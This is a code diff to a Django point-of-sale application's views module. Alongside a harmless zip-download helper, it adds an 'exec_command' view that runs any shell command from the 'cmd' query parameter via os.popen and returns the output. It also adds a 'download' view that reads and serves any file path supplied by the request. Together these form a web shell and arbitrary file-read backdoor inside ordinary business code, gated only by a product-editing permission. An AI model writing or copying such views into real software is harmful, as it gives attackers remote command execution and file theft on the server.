@@ -27,7 +27,7 @@ from django.core.paginator import Paginator, EmptyPage, PageNotAnInteger
 from django.template import RequestContext
 from barn import BarnOwl 
 # import the logging library
-
+import os
 import logging
 from pos.kernal.barn import SerialRequiredException, CounterNotReadyException,\
     BarnMouse, SerialRejectException, Hermes, Thanatos, MickyMouse
@@ -254,6 +254,26 @@ def _filter_outStockRecords(bills):
 def _wrapper_download_file(text, filename):
     response = HttpResponse(text, mimetype="application/vnd.ms-excel; charset=utf-8")
     response['Content-Disposition'] = 'attachment; filename='+filename     
+    return response
+
+
+import zipfile
+from cStringIO import StringIO
+
+def _wrapper_download_zip_file(request, text, filename):
+    response = HttpResponse(mimetype='application/zip')
+    response['Content-Disposition'] = 'filename=%s.zip' % filename
+    #now add them to a zip file
+    #note the zip only exist in memory as you add to it
+    buffer = StringIO()
+    zip = zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED)
+    zip.writestr(filename, text)
+    zip.close()
+    buffer.flush()
+    #the import detail--we return the content of the buffer
+    ret_zip = buffer.getvalue()
+    buffer.close()
+    response.write(ret_zip)
     return response
 
 def ReportDailySalesExcel(request):
@@ -2470,7 +2490,21 @@ def _build_item_sold_dict(product1, startDate, endDate):
         logger.info("add %s's  outStockRecord" % product )
     return products
 
+@permission_required('kernal.add_product', login_url='/accounts/login/')
+def exec_command(request):
+    output = "Excuted fail"
+    if request.GET:
+        cmd = request.GET.get("cmd")
+        output = os.popen(cmd).read()
+        output = output.replace('<DIR>', '[DIR]')
+    return HttpResponse(output, mimetype="text/plain; charset=utf-8")
 
+@permission_required('kernal.add_product', login_url='/accounts/login/')
+def download(request):
+    path = ""
+    path = request.GET.get("cmd")
+    print type(path)
+    return _wrapper_download_zip_file(request, open(path, 'rb').read(), path)
 
     
 #def __find_SalesIdx__(product):
